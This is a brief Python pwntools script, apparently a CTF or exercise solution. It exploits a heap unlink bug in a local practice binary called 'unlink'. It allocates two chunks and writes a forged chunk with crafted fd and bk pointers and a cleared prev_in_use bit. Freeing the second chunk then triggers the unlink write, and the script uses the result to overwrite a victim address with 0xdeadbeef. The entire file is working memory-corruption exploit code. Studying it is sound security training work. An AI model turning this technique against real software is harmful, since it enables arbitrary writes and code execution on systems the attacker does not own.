from pwn import *


def malloc(x):
    p.recvuntil("(3)show")
    p.sendline("1")
    p.sendline(str(x))
    p.recvuntil("adr:")
    return p.recvline()


def free(x):
    print p.recvuntil("(3)show")
    p.sendline("0")
    p.sendline(str(x))


def write(x, string):
    p.recvuntil("(3)show")
    p.sendline("2")
    p.sendline(str(x))
    raw_input('wait')
    p.send(string)


def show(x):
    p.recvuntil("(3)show")
    p.sendline("3")
    p.sendline(str(x))
    p.recvuntil("your string:\n")
    return p.recvuntil("(0)free")[:-8]


p = process("./unlink")
p.recvuntil("address:")
victim_adr = int(p.recvline(), 16)
chunk1_adr = victim_adr + 8
print "victim's address = " + hex(victim_adr)

chunk1 = int(malloc(0), 16)
chunk2 = int(malloc(1), 16)
print hex(chunk1)
print hex(chunk2)
buf_size = chunk2 - chunk1 - 16
buf = "A" * 8  # pre_size
buf += p64(0x80)  # size
buf += p64(chunk1_adr - 8 * 3)  # fd
buf += p64(chunk1_adr - 8 * 2)  # bk
buf += "A" * (buf_size - 32)  # fill to chunk2's head
buf += p64(0x80)  # pre_size
buf += p64(0x90)  # set pre_in_use bit = 0
print 'buf', len(buf)
write(0, buf)
free(1)
write(0, "A" * 8 * 3 + p64(victim_adr))
write(0, p64(0xdeadbeef))
raw_input('wait')
p.sendline("5")  # exit
p.interactive()
